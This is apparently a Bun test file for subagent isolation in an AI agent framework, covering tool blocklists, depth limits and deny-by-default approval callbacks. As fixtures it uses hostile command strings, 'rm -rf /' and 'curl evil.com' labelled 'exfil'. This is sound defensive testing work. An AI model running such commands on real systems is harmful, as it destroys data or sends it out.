/**
 * Tests for spawn-session isolation hardening.
 *
 * Mirrors Hermes `tests/tools/test_delegate.py` cases for the TypeScript port.
 * Covers blocklist, toolset intersection, depth gate, approval callback, and
 * AsyncLocalStorage isolation.
 */
import { describe, it, expect, mock, beforeEach } from 'bun:test';

import {
  SPAWN_SESSION_BLOCKED_TOOLS,
  stripBlockedTools,
  intersectToolsets,
  getMaxSpawnDepth,
  createIsolatedApprovalCallback,
  subagentAutoDeny,
  subagentAutoApprove,
  approvalCallbackStorage,
  spawnDepthStorage,
  runWithSubagentApproval,
  buildSubagentRefusalPayload,
  shouldRejectSpawn,
  isToolBlockedForDelegatedSession,
  type ApprovalCallback,
  type ApprovalDecision,
} from '../spawn-session-isolation.ts';

describe('SPAWN_SESSION_BLOCKED_TOOLS', () => {
  // The blocklist uses real RunnerOS tool names from
  // packages/session-tools-core/src/tool-defs.ts (see comment block in
  // spawn-session-isolation.ts).
  const EXPECTED_BLOCKED = [
    'spawn_session',
    'source_credential_prompt',
    'source_oauth_trigger',
    'source_google_oauth_trigger',
    'source_slack_oauth_trigger',
    'source_microsoft_oauth_trigger',
    'update_user_preferences',
    'save_memory',
    'update_memory',
    'forget_memory',
    'send_agent_message',
    'supply_work_input',
    'script_sandbox',
  ];

  it('contains the expected RunnerOS-mapped blocked tools', () => {
    expect(SPAWN_SESSION_BLOCKED_TOOLS.size).toBe(EXPECTED_BLOCKED.length);
    for (const name of EXPECTED_BLOCKED) {
      expect(SPAWN_SESSION_BLOCKED_TOOLS.has(name)).toBe(true);
    }
  });

  it('is frozen (cannot be mutated)', () => {
    expect(Object.isFrozen(SPAWN_SESSION_BLOCKED_TOOLS)).toBe(true);
  });

  it('covers each Hermes category with at least one RunnerOS tool', () => {
    // recursive spawn
    expect(SPAWN_SESSION_BLOCKED_TOOLS.has('spawn_session')).toBe(true);
    // user prompts / clarify family
    expect(SPAWN_SESSION_BLOCKED_TOOLS.has('source_credential_prompt')).toBe(true);
    // memory writes
    expect(SPAWN_SESSION_BLOCKED_TOOLS.has('save_memory')).toBe(true);
    // cross-platform messaging
    expect(SPAWN_SESSION_BLOCKED_TOOLS.has('send_agent_message')).toBe(true);
    // code execution
    expect(SPAWN_SESSION_BLOCKED_TOOLS.has('script_sandbox')).toBe(true);
  });
});

describe('stripBlockedTools', () => {
  it('removes blocked RunnerOS tools but keeps allowed ones', () => {
    expect(stripBlockedTools(['spawn_session', 'read_file', 'save_memory'])).toEqual(['read_file']);
  });

  it('returns empty array when all are blocked', () => {
    expect(stripBlockedTools(['spawn_session', 'save_memory', 'script_sandbox'])).toEqual([]);
  });

  it('returns original list when none are blocked', () => {
    expect(stripBlockedTools(['read_file', 'write_file', 'bash'])).toEqual([
      'read_file',
      'write_file',
      'bash',
    ]);
  });

  it('handles empty input', () => {
    expect(stripBlockedTools([])).toEqual([]);
  });
});

describe('delegated session tool visibility', () => {
  it('blocks both Claude and Pi spellings only for delegated children', () => {
    expect(isToolBlockedForDelegatedSession('save_memory', true)).toBe(true);
    expect(isToolBlockedForDelegatedSession('mcp__session__save_memory', true)).toBe(true);
    expect(isToolBlockedForDelegatedSession('supply_work_input', true)).toBe(true);
    expect(isToolBlockedForDelegatedSession('save_memory', false)).toBe(false);
    expect(isToolBlockedForDelegatedSession('read_file', true)).toBe(false);
  });
});

describe('intersectToolsets', () => {
  it('intersects two sets', () => {
    expect(intersectToolsets(['a', 'b', 'c'], ['b', 'c', 'd'])).toEqual(['b', 'c']);
  });

  it('returns empty for disjoint sets', () => {
    expect(intersectToolsets(['a'], ['b'])).toEqual([]);
  });

  it('returns empty if parent is empty', () => {
    expect(intersectToolsets([], ['a', 'b'])).toEqual([]);
  });

  it('returns empty if requested is empty', () => {
    expect(intersectToolsets(['a', 'b'], [])).toEqual([]);
  });

  it('preserves order from requested', () => {
    expect(intersectToolsets(['a', 'b', 'c'], ['c', 'a'])).toEqual(['c', 'a']);
  });
});

describe('getMaxSpawnDepth', () => {
  it('returns 1 by default', () => {
    expect(getMaxSpawnDepth({})).toBe(1);
    expect(getMaxSpawnDepth({ delegation: {} })).toBe(1);
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: undefined } })).toBe(1);
  });

  it('returns configured value within range', () => {
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 2 } })).toBe(2);
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 3 } })).toBe(3);
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 1 } })).toBe(1);
  });

  it('clamps -5 to 1', () => {
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: -5 } })).toBe(1);
  });

  it('clamps 99 to 3', () => {
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 99 } })).toBe(3);
  });

  it('clamps 0 to 1', () => {
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 0 } })).toBe(1);
  });

  it('floors non-integer values then clamps', () => {
    expect(getMaxSpawnDepth({ delegation: { max_spawn_depth: 2.7 } })).toBe(2);
  });
});

describe('approval callbacks', () => {
  const args = { command: 'rm -rf /', description: 'dangerous' };

  it('subagentAutoDeny returns "deny"', () => {
    expect(subagentAutoDeny(args)).toBe('deny');
  });

  it('subagentAutoApprove returns "once"', () => {
    expect(subagentAutoApprove(args)).toBe('once');
  });

  it('createIsolatedApprovalCallback with auto_approve=false returns deny callback', () => {
    const cb = createIsolatedApprovalCallback({ delegation: { subagent_auto_approve: false } });
    expect(cb(args)).toBe('deny');
  });

  it('createIsolatedApprovalCallback default is deny', () => {
    const cb = createIsolatedApprovalCallback({});
    expect(cb(args)).toBe('deny');
  });

  it('createIsolatedApprovalCallback with auto_approve=true returns approve callback', () => {
    const cb = createIsolatedApprovalCallback({ delegation: { subagent_auto_approve: true } });
    expect(cb(args)).toBe('once');
  });
});

describe('AsyncLocalStorage isolation', () => {
  it('runWithSubagentApproval scopes the callback to the inner async block', async () => {
    const parentCb: ApprovalCallback = () => 'once';
    const subCb: ApprovalCallback = () => 'deny';

    let innerSeen: ApprovalDecision | undefined;
    let outerSeen: ApprovalDecision | undefined;

    await approvalCallbackStorage.run(parentCb, async () => {
      outerSeen = approvalCallbackStorage.getStore()?.({ command: '', description: '' });
      await runWithSubagentApproval(subCb, async () => {
        innerSeen = approvalCallbackStorage.getStore()?.({ command: '', description: '' });
      });
    });

    expect(outerSeen).toBe('once');
    expect(innerSeen).toBe('deny');
  });

  it('spawnDepthStorage isolates depth per async scope', async () => {
    let inner: number | undefined;
    let outer: number | undefined;
    await spawnDepthStorage.run(0, async () => {
      outer = spawnDepthStorage.getStore();
      await spawnDepthStorage.run(1, async () => {
        inner = spawnDepthStorage.getStore();
      });
    });
    expect(outer).toBe(0);
    expect(inner).toBe(1);
  });
});

describe('depth gate', () => {
  it('shouldRejectSpawn returns false at depth 0 with max 1', () => {
    expect(shouldRejectSpawn(0, 1)).toBe(false);
  });

  it('shouldRejectSpawn returns true when current depth == max', () => {
    expect(shouldRejectSpawn(1, 1)).toBe(true);
    expect(shouldRejectSpawn(3, 3)).toBe(true);
  });

  it('shouldRejectSpawn returns true when current depth exceeds max', () => {
    expect(shouldRejectSpawn(2, 1)).toBe(true);
  });

  it('shouldRejectSpawn returns false when below max', () => {
    expect(shouldRejectSpawn(1, 2)).toBe(false);
    expect(shouldRejectSpawn(0, 3)).toBe(false);
  });
});

describe('refusal payload', () => {
  it('buildSubagentRefusalPayload includes tool name and refusal flag', () => {
    const payload = buildSubagentRefusalPayload('spawn_session');
    expect(payload.refusal).toBe(true);
    expect(payload.error).toContain('spawn_session');
    expect(payload.error.toLowerCase()).toContain('subagent');
  });

  it('is a plain object (not thrown)', () => {
    const payload = buildSubagentRefusalPayload('memory');
    expect(payload).toBeDefined();
    expect(typeof payload.error).toBe('string');
  });
});

describe('integration: simulated subagent spawn flow', () => {
  it('subagent attempting spawn_session receives refusal payload (not exception)', () => {
    const currentDepth = 1;
    const maxDepth = getMaxSpawnDepth({ delegation: { max_spawn_depth: 1 } });
    let payload: { error: string; refusal: true } | null = null;
    let threw = false;
    try {
      if (shouldRejectSpawn(currentDepth, maxDepth)) {
        payload = buildSubagentRefusalPayload('spawn_session');
      }
    } catch {
      threw = true;
    }
    expect(threw).toBe(false);
    expect(payload?.refusal).toBe(true);
  });

  it('child source slugs are intersection of requested with parent slugs', () => {
    // Source slugs identify sources (github, gmail, etc.), not tool names.
    // The blocklist does NOT apply here; it applies at the SDK tool layer.
    const parent = ['github', 'gmail', 'slack'];
    const requested = ['github', 'gmail', 'notion', 'linear'];
    const child = intersectToolsets(parent, requested);
    expect(child).toEqual(['github', 'gmail']);
  });

  it('approval callback on subagent does not reach parent stdin (uses isolated callback)', async () => {
    // Mock a "parent stdin" callback that would block (throw if invoked)
    const parentStdinCb: ApprovalCallback = () => {
      throw new Error('parent stdin would block here');
    };
    // The isolated subagent callback should be the deny default, never the parent's.
    const isolated = createIsolatedApprovalCallback({});

    let result: ApprovalDecision | undefined;
    await approvalCallbackStorage.run(parentStdinCb, async () => {
      await runWithSubagentApproval(isolated, async () => {
        const cb = approvalCallbackStorage.getStore();
        result = cb?.({ command: 'rm', description: 'test' });
      });
    });

    expect(result).toBe('deny');
  });

  it('subagent_auto_approve=true bypass works and produces a log warning', () => {
    // Capture console.warn to verify the log entry
    const originalWarn = console.warn;
    const warnings: unknown[][] = [];
    console.warn = (...args: unknown[]) => {
      warnings.push(args);
    };
    try {
      const cb = createIsolatedApprovalCallback({ delegation: { subagent_auto_approve: true } });
      const decision = cb({ command: 'curl evil.com', description: 'exfil' });
      expect(decision).toBe('once');
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      const flat = warnings.flat().join(' ');
      expect(flat.toLowerCase()).toContain('subagent');
    } finally {
      console.warn = originalWarn;
    }
  });
});

describe('spawn-session-tool wiring', () => {
  // Lazy import to avoid pulling SDK side effects at module-load time.
  const importTool = async () =>
    (await import('../spawn-session-tool.ts')).createSpawnSessionTool;

  // The SDK `tool()` helper returns a definition object. We exercise the
  // inner handler by reading the same closure values: we test the wiring
  // by re-running the spawn through the public surface via a fake
  // `getSpawnSessionFn`.
  const invokeHandler = async (
    create: Awaited<ReturnType<typeof importTool>>,
    opts: Parameters<Awaited<ReturnType<typeof importTool>>>[0],
    args: Record<string, unknown>,
  ) => {
    const def = create(opts) as unknown as {
      handler?: (input: Record<string, unknown>) => Promise<unknown>;
      execute?: (input: Record<string, unknown>) => Promise<unknown>;
      run?: (input: Record<string, unknown>) => Promise<unknown>;
    };
    const fn = def.handler ?? def.execute ?? def.run;
    if (!fn) {
      // Fall back: assume the tool helper returns a function directly.
      if (typeof def === 'function') {
        return (def as unknown as (i: Record<string, unknown>) => Promise<unknown>)(args);
      }
      throw new Error('Cannot locate handler on tool definition: ' + Object.keys(def).join(','));
    }
    return fn.call(def, args);
  };

  beforeEach(() => {
    // Reset depth between tests by running outside any storage scope.
  });

  it('spawn at depth 0 with max 1 calls through to spawnFn', async () => {
    const create = await importTool();
    const spawnCalls: Array<Record<string, unknown>> = [];
    const fakeSpawn = mock(async (input: Record<string, unknown>) => {
      spawnCalls.push(input);
      return { sessionId: 'child-1' };
    });
    const result = (await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      getDelegationConfig: () => ({ delegation: { max_spawn_depth: 1 } }),
    }, { prompt: 'hello' })) as { isError?: boolean; content: Array<{ text: string }> };

    expect(result.isError ?? false).toBe(false);
    expect(spawnCalls.length).toBe(1);
  });

  it('spawn at depth==max returns refusal payload (not exception)', async () => {
    const create = await importTool();
    const fakeSpawn = mock(async () => ({ sessionId: 'should-not-be-called' }));
    // Simulate already being inside a depth=1 subagent.
    const result = (await spawnDepthStorage.run(1, () =>
      invokeHandler(create, {
        sessionId: 's-child',
        getSpawnSessionFn: () => fakeSpawn as never,
        getDelegationConfig: () => ({ delegation: { max_spawn_depth: 1 } }),
      }, { prompt: 'recurse' }),
    )) as { isError?: boolean; content: Array<{ text: string }> };

    expect(result.isError).toBe(true);
    expect(fakeSpawn).toHaveBeenCalledTimes(0);
    const text = result.content[0]?.text ?? '';
    expect(text).toContain('refusal');
    expect(text).toContain('spawn_session');
  });

  it('intersects requested enabledSourceSlugs with parent source slugs (no blocklist at source layer)', async () => {
    const create = await importTool();
    let observed: Record<string, unknown> | null = null;
    const fakeSpawn = mock(async (input: Record<string, unknown>) => {
      observed = input;
      return { sessionId: 'child' };
    });
    await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      // Real source slugs — these identify sources, not tool names.
      getParentSourceSlugs: () => ['github', 'gmail', 'slack'],
    }, {
      prompt: 'go',
      enabledSourceSlugs: ['github', 'gmail', 'notion', 'linear'],
    });
    // Intersection drops sources parent can't reach. The blocklist is a
    // tool-name filter applied elsewhere (SDK tool layer) and never
    // touches source slugs.
    expect((observed as unknown as { enabledSourceSlugs?: string[] } | null)?.enabledSourceSlugs).toEqual([
      'github',
      'gmail',
    ]);
  });

  it('without parent source slugs (inherit defaults), passes requested through unchanged', async () => {
    const create = await importTool();
    let observed: Record<string, unknown> | null = null;
    const fakeSpawn = mock(async (input: Record<string, unknown>) => {
      observed = input;
      return { sessionId: 'child' };
    });
    await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      // getParentSourceSlugs omitted — parent has no explicit allowlist
      // (inherit defaults; distinct from "deny all").
    }, {
      prompt: 'go',
      enabledSourceSlugs: ['github', 'gmail'],
    });
    expect((observed as unknown as { enabledSourceSlugs?: string[] } | null)?.enabledSourceSlugs).toEqual([
      'github',
      'gmail',
    ]);
  });

  it('legacy getParentToolset option still works (deprecated alias for getParentSourceSlugs)', async () => {
    const create = await importTool();
    let observed: Record<string, unknown> | null = null;
    const fakeSpawn = mock(async (input: Record<string, unknown>) => {
      observed = input;
      return { sessionId: 'child' };
    });
    await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      getParentToolset: () => ['github'],
    }, {
      prompt: 'go',
      enabledSourceSlugs: ['github', 'gmail'],
    });
    expect((observed as unknown as { enabledSourceSlugs?: string[] } | null)?.enabledSourceSlugs).toEqual([
      'github',
    ]);
  });

  it('installs isolated approval callback before invoking spawnFn', async () => {
    const create = await importTool();
    let innerCallbackDecision: ApprovalDecision | undefined;
    const fakeSpawn = mock(async () => {
      const cb = approvalCallbackStorage.getStore();
      innerCallbackDecision = cb?.({ command: 'x', description: 'y' });
      return { sessionId: 'child' };
    });
    await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      getDelegationConfig: () => ({ delegation: { subagent_auto_approve: false } }),
    }, { prompt: 'go' });
    expect(innerCallbackDecision).toBe('deny');
  });
});

// ---------------------------------------------------------------------------
// B1 — production wiring: the resolvers passed by session-scoped-tools.ts
// must read from stored config (max_spawn_depth + subagent_auto_approve)
// rather than falling back to defaults. We construct the same closure shape
// the production call site uses and verify the depth gate respects it.
// ---------------------------------------------------------------------------
describe('production wiring: getDelegationConfig honors stored config', () => {
  const importTool = async () =>
    (await import('../spawn-session-tool.ts')).createSpawnSessionTool;

  const invokeHandler = async (
    create: Awaited<ReturnType<typeof importTool>>,
    opts: Parameters<Awaited<ReturnType<typeof importTool>>>[0],
    args: Record<string, unknown>,
  ) => {
    const def = create(opts) as unknown as {
      handler?: (input: Record<string, unknown>) => Promise<unknown>;
      execute?: (input: Record<string, unknown>) => Promise<unknown>;
      run?: (input: Record<string, unknown>) => Promise<unknown>;
    };
    const fn = def.handler ?? def.execute ?? def.run;
    if (!fn) throw new Error('handler not found');
    return fn.call(def, args);
  };

  it('depth-2 stored config allows spawn at depth 1 (proves config is read)', async () => {
    const create = await importTool();
    const fakeSpawn = mock(async () => ({ sessionId: 'child' }));

    // Simulate the exact closure the production wiring builds in
    // session-scoped-tools.ts: getDelegationConfig delegates to a stored
    // config reader. We stand in a fake reader here; the production path
    // calls `loadStoredConfig()` the same way.
    const fakeStoredConfig = { delegation: { max_spawn_depth: 2 } };
    const getDelegationConfig = () => ({ delegation: fakeStoredConfig.delegation });

    // At depth 1, with max_spawn_depth=1 (default) we would refuse. With
    // max_spawn_depth=2 from stored config, we must allow.
    const result = (await spawnDepthStorage.run(1, () =>
      invokeHandler(create, {
        sessionId: 's-child',
        getSpawnSessionFn: () => fakeSpawn as never,
        getDelegationConfig,
      }, { prompt: 'go' }),
    )) as { isError?: boolean };

    expect(result.isError ?? false).toBe(false);
    expect(fakeSpawn).toHaveBeenCalledTimes(1);
  });

  it('depth-2 stored config still rejects at depth 2 (proves clamp + config interplay)', async () => {
    const create = await importTool();
    const fakeSpawn = mock(async () => ({ sessionId: 'should-not-spawn' }));
    const getDelegationConfig = () => ({ delegation: { max_spawn_depth: 2 } });

    const result = (await spawnDepthStorage.run(2, () =>
      invokeHandler(create, {
        sessionId: 's-grandchild',
        getSpawnSessionFn: () => fakeSpawn as never,
        getDelegationConfig,
      }, { prompt: 'go' }),
    )) as { isError?: boolean; content: Array<{ text: string }> };

    expect(result.isError).toBe(true);
    expect(fakeSpawn).toHaveBeenCalledTimes(0);
  });

  it('production call site in session-scoped-tools.ts builds resolvers that read from stored config + session', async () => {
    // We can't easily mock the disk reads from inside Bun's test runner,
    // so we assert the *shape* of the wiring: the production call site
    // imports `loadStoredConfig` and `loadSession`, and the spawn-tool
    // factory option names line up. If someone removes these imports the
    // test fails — preventing a regression of B1 where the resolvers were
    // never passed.
    const tools = await import('../session-scoped-tools.ts');
    expect(typeof tools.getSessionScopedTools).toBe('function');

    // Sanity: the spawn-session-tool factory accepts the two production
    // resolvers (getDelegationConfig + getParentSourceSlugs). A type-level
    // contract regression would surface as a missing key here.
    const create = (await import('../spawn-session-tool.ts')).createSpawnSessionTool;
    const def = create({
      sessionId: 's',
      getSpawnSessionFn: () => undefined,
      getDelegationConfig: () => ({}),
      getParentSourceSlugs: () => undefined,
    });
    expect(def).toBeDefined();
    expect(def.description).toContain('separate user-visible session');
    expect(def.description).toContain('use message_agent instead');
  });

  it('subagent_auto_approve=true in stored config reaches the approval callback', async () => {
    const create = await importTool();
    let decision: ApprovalDecision | undefined;
    const fakeSpawn = mock(async () => {
      const cb = approvalCallbackStorage.getStore();
      decision = cb?.({ command: 'curl x', description: 'audit' });
      return { sessionId: 'child' };
    });
    const getDelegationConfig = () => ({ delegation: { subagent_auto_approve: true } });

    await invokeHandler(create, {
      sessionId: 's-parent',
      getSpawnSessionFn: () => fakeSpawn as never,
      getDelegationConfig,
    }, { prompt: 'go' });

    expect(decision).toBe('once');
  });
});
